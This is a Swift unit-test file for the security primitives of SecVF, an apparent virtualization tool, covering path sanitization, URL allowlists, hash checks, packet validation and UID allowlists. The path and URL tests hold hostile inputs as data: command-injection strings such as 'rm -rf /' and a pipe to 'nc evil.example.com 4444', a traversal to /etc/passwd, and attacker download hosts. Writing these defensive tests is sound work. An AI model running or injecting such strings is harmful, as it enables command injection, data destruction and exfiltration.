//
//  SecurityPrimitivesTests.swift
//  SecVFTests
//
//  Unit tests for the security-critical primitives the audit (item 20 of
//  CODE_REVIEW_2026-05-03) called out as having zero coverage:
//  sanitizePath / isPathWithinAllowedDirectories, validateDownloadURL
//  (Linux + IPSW), verifySHA256, validatePacket, detectMACSpoof, vsock
//  exec-bridge peer-allowlist parser, and VMSecurityMonitor severity
//  escalation.
//
//  Each test follows Given/When/Then structure per the project's test style.
//

import XCTest
import CryptoKit
@testable import SecVF

final class SecurityPrimitivesTests: XCTestCase {

    // MARK: - ScriptsUSBManager.sanitizePath

    func testSanitizePath_acceptsHomeRelativePath() {
        // Given a path under the user's home directory
        let path = NSHomeDirectory() + "/Code/SecVF/scripts"
        // When sanitized
        let result = ScriptsUSBManager.shared.sanitizePath(path)
        // Then the path is returned in its standardized form
        XCTAssertNotNil(result, "Plain home-relative path must pass sanitization")
    }

    func testSanitizePath_traversalThatEscapesHomeIsCaughtByAllowlist() {
        // Given a `..` traversal that resolves OUT of the user's home tree.
        // sanitizePath() itself relies on standardizingPath, which collapses
        // the `..` segments before the substring check — so sanitizePath()
        // alone won't see literal `..`. The defense in depth is the
        // allowlist check (item 8 of the code review): the resolved path
        // must still be inside the allowlist.
        let path = NSHomeDirectory() + "/Code/../../../../../../etc/passwd"
        let mgr = ScriptsUSBManager.shared
        let sanitized = mgr.sanitizePath(path)
        // sanitizePath standardizes the form; the result, if any, must
        // not pass the allowlist gate.
        if let s = sanitized {
            XCTAssertFalse(mgr.isPathWithinAllowedDirectories(s),
                           "A `..` traversal that escapes $HOME must be rejected by the allowlist (got: \(s))")
        }
    }

    func testSanitizePath_rejectsShellMetacharacters() {
        // Given a path containing characters that could be shell-injected
        // when handed to an external process
        let cases = [
            "/tmp/foo;rm -rf /",
            "/tmp/foo`whoami`",
            "/tmp/foo$(id)",
            "/tmp/foo|nc evil.example.com 4444",
            "/tmp/foo&&touch pwned",
        ]
        // Then each case is rejected
        for path in cases {
            XCTAssertNil(ScriptsUSBManager.shared.sanitizePath(path),
                         "Shell-metachar path must be rejected: \(path)")
        }
    }

    func testSanitizePath_rejectsLeadingDash() {
        // Given a path that starts with `-` (would be parsed as an option
        // flag if naively passed to a CLI tool)
        let path = "-rf /tmp/something"
        // When sanitized
        let result = ScriptsUSBManager.shared.sanitizePath(path)
        // Then it's rejected
        XCTAssertNil(result, "Leading-dash paths must be rejected (option-injection)")
    }

    // MARK: - ScriptsUSBManager.isPathWithinAllowedDirectories

    func testIsPathWithinAllowedDirectories_rejectsSiblingPrefixCollision() {
        // Given a path that shares a string prefix with $HOME but is in a
        // sibling directory (e.g. /Users/openclaw vs /Users/openclaw_evil).
        // The fix appends a trailing slash to the prefix so this no longer
        // passes — without the fix, hasPrefix() of $HOME would match.
        let home = NSHomeDirectory()
        let evil = home + "_evil/script.sh"
        // When tested
        let allowed = ScriptsUSBManager.shared.isPathWithinAllowedDirectories(evil)
        // Then it must be rejected
        XCTAssertFalse(allowed, "Sibling-directory whose name begins with $HOME must be rejected")
    }

    func testIsPathWithinAllowedDirectories_acceptsHomePrefixed() {
        // Given a real path inside the user's home directory
        let path = NSHomeDirectory() + "/Code/SecVF/scripts/router-setup.sh"
        // When tested
        let allowed = ScriptsUSBManager.shared.isPathWithinAllowedDirectories(path)
        // Then it's accepted
        XCTAssertTrue(allowed, "Genuine $HOME path must be accepted")
    }

    func testIsPathWithinAllowedDirectories_acceptsTmp() {
        // Given a path under /tmp
        let path = "/tmp/secvf-temp/foo.sh"
        // When tested
        let allowed = ScriptsUSBManager.shared.isPathWithinAllowedDirectories(path)
        // Then it's accepted
        XCTAssertTrue(allowed, "/tmp paths must be accepted")
    }

    func testIsPathWithinAllowedDirectories_rejectsEtc() {
        // Given a path outside any allowed prefix
        let path = "/etc/passwd"
        // When tested
        let allowed = ScriptsUSBManager.shared.isPathWithinAllowedDirectories(path)
        // Then it's rejected
        XCTAssertFalse(allowed, "/etc paths must be rejected")
    }

    // MARK: - MacOSVMInstaller.validateDownloadURL

    func testIPSWValidate_acceptsAppleCDN() {
        // Given a URL on an approved Apple CDN
        let url = URL(string: "https://updates.cdn-apple.com/Restore.ipsw")!
        // When validated
        let installer = MacOSVMInstaller(vmBundlePath: "/tmp/test")
        // Then accepted
        XCTAssertTrue(installer.validateDownloadURL(url))
    }

    func testIPSWValidate_rejectsHTTP() {
        // Given a non-HTTPS URL on an Apple CDN host
        let url = URL(string: "http://updates.cdn-apple.com/Restore.ipsw")!
        // When validated, then rejected
        let installer = MacOSVMInstaller(vmBundlePath: "/tmp/test")
        XCTAssertFalse(installer.validateDownloadURL(url))
    }

    func testIPSWValidate_rejectsUnauthorizedHost() {
        // Given an HTTPS URL on a non-Apple host
        let url = URL(string: "https://evil.example.com/Restore.ipsw")!
        // When validated, then rejected
        let installer = MacOSVMInstaller(vmBundlePath: "/tmp/test")
        XCTAssertFalse(installer.validateDownloadURL(url))
    }

    func testIPSWValidate_rejectsNonIPSWExtension() {
        // Given an HTTPS URL on an Apple CDN but pointing at a non-.ipsw file
        let url = URL(string: "https://updates.cdn-apple.com/restore.zip")!
        // When validated, then rejected
        let installer = MacOSVMInstaller(vmBundlePath: "/tmp/test")
        XCTAssertFalse(installer.validateDownloadURL(url))
    }

    // MARK: - ISOCacheManager.validateDownloadURL

    func testISOValidate_rejectsHTTP() {
        let url = URL(string: "http://cdimage.kali.org/foo.iso")!
        XCTAssertFalse(
            ISOCacheManager.shared.validateDownloadURL(url, allowedDomains: ["cdimage.kali.org"]),
            "HTTP scheme must be rejected for ISO downloads"
        )
    }

    func testISOValidate_rejectsForeignHost() {
        let url = URL(string: "https://evil.example.com/foo.iso")!
        XCTAssertFalse(
            ISOCacheManager.shared.validateDownloadURL(url, allowedDomains: ["cdimage.kali.org"]),
            "Off-allowlist host must be rejected"
        )
    }

    func testISOValidate_rejectsNonISOExtension() {
        let url = URL(string: "https://cdimage.kali.org/foo.exe")!
        XCTAssertFalse(
            ISOCacheManager.shared.validateDownloadURL(url, allowedDomains: ["cdimage.kali.org"]),
            "Non-.iso extension must be rejected"
        )
    }

    func testISOValidate_acceptsApprovedDomainHTTPSISO() {
        let url = URL(string: "https://cdimage.kali.org/kali-2025.4-installer-arm64.iso")!
        XCTAssertTrue(
            ISOCacheManager.shared.validateDownloadURL(url, allowedDomains: ["cdimage.kali.org"]),
            "Allowlisted HTTPS .iso must be accepted"
        )
    }

    // MARK: - ISOCacheManager.verifySHA256

    func testVerifySHA256_happyPath() throws {
        // Given a known file with a known SHA256
        let tmp = FileManager.default.temporaryDirectory
            .appendingPathComponent("sha-test-\(UUID().uuidString).bin")
        let content = Data("hello secvf\n".utf8)
        try content.write(to: tmp)
        defer { try? FileManager.default.removeItem(at: tmp) }
        let expected = SHA256.hash(data: content).compactMap { String(format: "%02x", $0) }.joined()
        // When/Then: streaming hasher matches
        XCTAssertTrue(ISOCacheManager.shared.verifySHA256(file: tmp, expectedHash: expected))
    }

    func testVerifySHA256_mismatchFails() throws {
        // Given a real file but a wrong expected hash
        let tmp = FileManager.default.temporaryDirectory
            .appendingPathComponent("sha-test-\(UUID().uuidString).bin")
        try Data("hello secvf\n".utf8).write(to: tmp)
        defer { try? FileManager.default.removeItem(at: tmp) }
        let bogus = String(repeating: "00", count: 32)
        // When/Then: verifier returns false
        XCTAssertFalse(ISOCacheManager.shared.verifySHA256(file: tmp, expectedHash: bogus))
    }

    func testVerifySHA256_progressCallbackReachesOne() throws {
        // Given a file > 1 MB so multiple chunk callbacks fire
        let tmp = FileManager.default.temporaryDirectory
            .appendingPathComponent("sha-progress-\(UUID().uuidString).bin")
        let chunk = Data(repeating: 0xab, count: 1024 * 1024)
        var content = Data()
        for _ in 0..<3 { content.append(chunk) }   // 3 MB
        try content.write(to: tmp)
        defer { try? FileManager.default.removeItem(at: tmp) }

        let expected = SHA256.hash(data: content).compactMap { String(format: "%02x", $0) }.joined()

        // When/Then: progress is monotonic and ends at 1.0
        var samples: [Double] = []
        let ok = ISOCacheManager.shared.verifySHA256(
            file: tmp,
            expectedHash: expected,
            progress: { samples.append($0) }
        )
        XCTAssertTrue(ok)
        XCTAssertFalse(samples.isEmpty, "progress callback must fire at least once for >1MB file")
        let last = try XCTUnwrap(samples.last)
        XCTAssertEqual(last, 1.0, accuracy: 0.0001, "progress must reach 1.0")
        for i in 1..<samples.count {
            XCTAssertGreaterThanOrEqual(samples[i], samples[i - 1],
                                       "progress must be monotonically non-decreasing")
        }
    }

    // MARK: - VirtualNetworkSwitch.validatePacket

    func testValidatePacket_rejectsTooSmall() {
        // Given an Ethernet frame shorter than the 14-byte header
        let data = Data([0x01, 0x02, 0x03])
        // When validated, then rejected
        XCTAssertFalse(VirtualNetworkSwitch.shared.validatePacket(data: data, fromVM: UUID()))
    }

    func testValidatePacket_rejectsOversize() {
        // Given a frame larger than the 9000-byte jumbo cap
        let data = Data(repeating: 0xaa, count: 9001)
        // When validated, then rejected
        XCTAssertFalse(VirtualNetworkSwitch.shared.validatePacket(data: data, fromVM: UUID()))
    }

    func testValidatePacket_acceptsMinimumFrame() {
        // Given a minimal valid Ethernet frame (14 bytes)
        let data = Data(repeating: 0x00, count: 14)
        // When validated, then accepted
        XCTAssertTrue(VirtualNetworkSwitch.shared.validatePacket(data: data, fromVM: UUID()))
    }

    // MARK: - VsockExecBridge.loadAllowlist parser

    func testLoadAllowlist_alwaysIncludesCurrentUID() {
        // Given a non-existent allowlist path
        let path = NSTemporaryDirectory() + "no-such-allowlist-\(UUID().uuidString)"
        // When parsed
        let allowed = VsockExecBridge.loadAllowlist(at: path)
        // Then current UID is always in the set (the always-allowed self-uid)
        XCTAssertTrue(allowed.contains(getuid()),
                      "Current UID must always be in allowlist regardless of file presence")
    }

    func testLoadAllowlist_parsesNumericUIDsAndIgnoresComments() throws {
        // Given an allowlist file with mixed content
        let path = NSTemporaryDirectory() + "allowlist-\(UUID().uuidString)"
        let body = """
        # comment line, ignored
        501

           502\u{20}\u{20}
        # 999  # inline comments aren't a feature; this whole line is a comment

        not_a_real_user_xyz_zzz
        """
        try body.write(toFile: path, atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(atPath: path) }

        // When parsed
        let allowed = VsockExecBridge.loadAllowlist(at: path)

        // Then numeric UIDs are present, comment + invalid username are not
        XCTAssertTrue(allowed.contains(getuid()))
        XCTAssertTrue(allowed.contains(501))
        XCTAssertTrue(allowed.contains(502))
        XCTAssertFalse(allowed.contains(999), "commented-out UID must not be honored")
    }

    // MARK: - VMSecurityMonitor severity escalation

    func testVMSecurityMonitor_criticalEventTriggersOnCritical() {
        // Given a fresh handler attached
        let monitor = VMSecurityMonitor.shared
        let priorAll = monitor.onSecurityEvent
        let priorCrit = monitor.onCriticalEvent
        defer {
            monitor.onSecurityEvent = priorAll
            monitor.onCriticalEvent = priorCrit
        }
        let allFired = expectation(description: "onSecurityEvent fires for every severity")
        allFired.expectedFulfillmentCount = 2
        let critFired = expectation(description: "onCriticalEvent fires only for critical/emergency")

        monitor.onSecurityEvent = { _ in allFired.fulfill() }
        monitor.onCriticalEvent = { event in
            // It must NOT fire for the warning case below
            XCTAssertTrue(event.severity == .critical || event.severity == .emergency,
                          "onCriticalEvent must only fire for critical/emergency, got \(event.severity)")
            critFired.fulfill()
        }

        // When a warning + a critical are logged
        monitor.logSecurityEvent(.warning, type: .networkAnomaly, vmName: "TestVM",
                                 message: "warn", details: [:])
        monitor.logSecurityEvent(.critical, type: .networkAnomaly, vmName: "TestVM",
                                 message: "crit", details: [:])

        // Then: both events go to onSecurityEvent, only the critical hits onCriticalEvent
        wait(for: [allFired, critFired], timeout: 1.0)
    }
}
